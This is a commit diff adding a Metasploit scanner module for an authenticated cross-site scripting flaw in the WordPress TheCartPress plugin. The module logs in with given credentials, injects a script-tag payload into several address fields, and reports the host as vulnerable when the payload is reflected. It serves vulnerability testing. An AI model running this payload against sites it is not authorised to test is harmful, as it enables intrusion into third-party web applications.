e7737cdcf45452eceab58ae74275e8ce8d1df3d6
Roberto Soares <robertoespreto@gmail.com>
2015-04-30 00:35:17 -0300

    Add WordPress TheCartPress Plugin XSS Scanner Vuln

---
+++ modules/auxiliary/scanner/http/wordpress/wp_thecartpress_xss_scanner.rb
@@ -0,0 +1,101 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit4 < Msf::Auxiliary
+
+  include Msf::HTTP::Wordpress
+  include Msf::Auxiliary::Scanner
+  include Msf::Auxiliary::Report
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'        => 'WordPress TheCartPress Plugin XSS Scanner',
+      'Description' => %q{
+      This module attempts to exploit a authenticated Cross-Site Scripting in TheCartPress Plugin for Wordpress,
+      version 1.3.8.2 and likely prior in order if the instance is vulnerable.
+      },
+      'Author'      =>
+        [
+          'High-Tech Bridge', # Vulnerability Discovery
+          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
+        ],
+      'License'     => MSF_LICENSE,
+      'References'  =>
+        [
+          ['CVE', '2015-3302'],
+          ['EDB', '36860'],
+          ['WPVDB', '7951'],
+          ['URL', 'https://www.htbridge.com/advisory/HTB23254']
+        ],
+      'DisclosureDate' => 'Apr 29 2015'
+    ))
+
+    register_options(
+      [
+        OptString.new('WP_USER', [true, 'A valid username', nil]),
+        OptString.new('WP_PASSWORD', [true, 'Valid password for the provided username', nil])
+      ], self.class)
+  end
+
+  def check
+    check_plugin_version_from_readme('thecartpress', '1.3.9')
+  end
+
+  def user
+    datastore['WP_USER']
+  end
+
+  def password
+    datastore['WP_PASSWORD']
+  end
+
+  def run_host(ip)
+    print_status("#{peer} - Trying to login as #{user}")
+    cookie = wordpress_login(user, password)
+    if cookie.nil?
+      print_error("#{peer} - Unable to login as #{user}")
+      return
+    end
+    print_good("#{peer} - Login successful")
+
+    xss = Rex::Text.rand_text_alpha(8)
+    xss_payload = "\"'><script>alert(\"#{xss}\");</script>"
+
+    res = send_request_cgi(
+      'uri'       => normalize_uri(wordpress_url_backend, 'admin.php'),
+      'vars_get' => {
+        'page'  => normalize_uri('thecartpress', 'admin', 'AddressEdit.php'),
+        'address_name' => xss_payload,
+        'firstname' => xss_payload,
+        'lastname'  => xss_payload,
+        'street'    => xss_payload,
+        'city'      => xss_payload,
+        'postcode'  => xss_payload,
+        'email'     => xss_payload
+      },
+      'cookie'      => cookie
+    )
+
+    unless res && res.body
+      print_error("#{peer} - Server did not respond in an expected way")
+      return
+    end
+
+    if res.code == 200 && res.body =~ /#{xss}/
+      print_good("#{peer} - Vulnerable to Cross-Site Scripting the \"TheCartPress 1.3.8.2\" plugin for Wordpress")
+      report_vuln(
+        host: rhost,
+        port: rport,
+        proto: 'tcp',
+        name: 'Cross-Site Scripting in TheCartPress 1.3.8.2 for Wordpress',
+        refs: references
+      )
+    else
+      print_error("#{peer} - Failed, maybe the target isn't vulnerable.")
+    end
+  end
+end
